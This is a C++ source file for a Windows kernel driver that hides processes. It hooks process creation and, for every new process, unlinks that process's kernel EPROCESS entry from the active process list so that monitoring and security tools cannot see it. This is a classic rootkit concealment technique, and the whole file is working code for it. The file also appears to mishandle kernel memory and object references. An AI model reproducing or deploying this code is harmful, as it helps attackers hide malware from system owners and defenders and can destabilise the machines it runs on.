#include "ProcessHider.h"

#include <ntddk.h>

#pragma warning( disable : 4302 4311 )

namespace filter
{

	NTSTATUS ProcessHider::Register()
	{
		ProcessHider::HideOnInitializeOperation();
		NTSTATUS status = PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)&ProcessHider::HideOnCreateOperation, FALSE);

		if (!NT_SUCCESS(status)) 
		{
			ProcessHider::Unload();
		}
		return status;
	}

	void ProcessHider::HideOnInitializeOperation()
	{
		
	}

	void ProcessHider::HideOnCreateOperation(HANDLE ppid, HANDLE pid, BOOLEAN create)
	{
		UNREFERENCED_PARAMETER(ppid);
		WCHAR msg[500] = { 0 };
		WCHAR name[500] = { 0 };

		if (create)
		{
			PEPROCESS process = NULL;
			PUNICODE_STRING process_name = NULL;

			if (PsLookupProcessByProcessId(pid, &process) != STATUS_SUCCESS)
			{
				return;
			}

			if (SeLocateProcessImageName(process, &process_name) != STATUS_SUCCESS)
			{
				return;
			}

			
			int size = process_name->Length / 2;
			int ans = -1;
			for (int i = size - 1; i >= 0; i--)
			{
				if (process_name->Buffer[i] == WCHAR(L'\\'))
				{
					ans = i;
					break;
				}
			}

			int mem_size = (size - (ans+1)) * 2;
			RtlCopyMemory(name, &process_name->Buffer[ans+1], mem_size);
			DebugMessage("Process created with PID %p and name length %d, name %S", pid, process_name->Length, name);
			

			ExFreePool(process_name->Buffer);
			HideProcess(pid);
		}
	}

	void ProcessHider::Unload()
	{
		PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)&ProcessHider::HideOnCreateOperation, TRUE);
	}

	void ProcessHider::HideProcess(HANDLE pid)
	{
		PEPROCESS p_eprocess;
		P_CUSTOM_EPROCESS cur_p_eprocess, pre_p_eprocess, next_p_eprocess;
		PLIST_ENTRY pre_p_list_entry_eprocess, next_p_list_entry_eprocess;
		NTSTATUS status = PsLookupProcessByProcessId(
			pid,
			&p_eprocess
		);

		if (status == STATUS_SUCCESS)
		{
			cur_p_eprocess = (P_CUSTOM_EPROCESS)(PVOID)p_eprocess;

			pre_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Blink;
			next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
			pre_p_eprocess = CONTAINING_RECORD(pre_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
			next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
			pre_p_eprocess->ActiveProcessLinks.Flink = next_p_list_entry_eprocess;
			next_p_eprocess->ActiveProcessLinks.Blink = pre_p_list_entry_eprocess;
		}
		return;
	}

}
